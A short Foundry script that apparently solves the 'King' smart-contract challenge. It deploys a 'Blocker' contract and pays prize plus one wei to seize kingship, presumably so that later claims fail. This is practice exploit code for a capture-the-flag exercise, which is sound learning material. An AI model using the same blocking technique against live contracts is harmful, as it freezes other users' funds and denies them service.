// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {King,Blocker} from "../src/King.sol";



contract SolveKing is Script {
    King public king;
    uint256 public prize;
    function setUp() public {}

    function run() public {
        king = King(payable(vm.envAddress("KING_ADDRESS")));
        prize = king.prize();
        vm.startBroadcast();
        // Deploy the Blocker contract
        Blocker blockClaimKinger = new Blocker(vm.envAddress("KING_ADDRESS"));
        // Send enough Ether to become the king
        blockClaimKinger.ClaimKing{value: prize+1 wei}();
        vm.stopBroadcast();
    }
}
